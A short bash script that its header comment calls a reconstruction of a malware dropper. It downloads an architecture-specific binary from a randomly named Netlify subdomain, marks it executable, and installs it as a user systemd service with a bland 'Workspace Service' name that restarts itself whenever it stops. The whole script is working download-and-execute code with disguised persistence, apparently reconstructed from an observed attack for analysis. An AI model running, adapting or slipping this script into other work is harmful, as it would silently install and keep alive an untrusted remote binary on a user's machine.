#!/usr/bin/env bash
# Reconstruction: generated Netlify site, $(uname -m 2>/dev/null), curl -o,
# chmod 755, respawning user systemd service.
set -Eeuo pipefail
readonly URL_BASE="https://quiet-otter-3fa9c1.netlify.app"
readonly BIN="${HOME}/.local/bin/workspace/workspace-binary"
readonly UNIT="${HOME}/.config/systemd/user/workspace-service.service"

machine="$(uname -m 2>/dev/null || true)"
case "$machine" in
  aarch64|arm64) asset="linux-arm64" ;;
  *) asset="linux-amd64" ;;
esac

mkdir -p "$(dirname "$BIN")" "$(dirname "$UNIT")"
curl -fsSL --max-time 30 -o "$BIN" "${URL_BASE}/${asset}"
chmod 755 "$BIN"

cat > "$UNIT" <<UNIT
[Unit]
Description=Workspace Service
[Service]
ExecStart=${BIN}
Restart=always
RestartSec=5
[Install]
WantedBy=default.target
UNIT

systemctl --user daemon-reload
systemctl --user enable workspace-service
systemctl --user start workspace-service
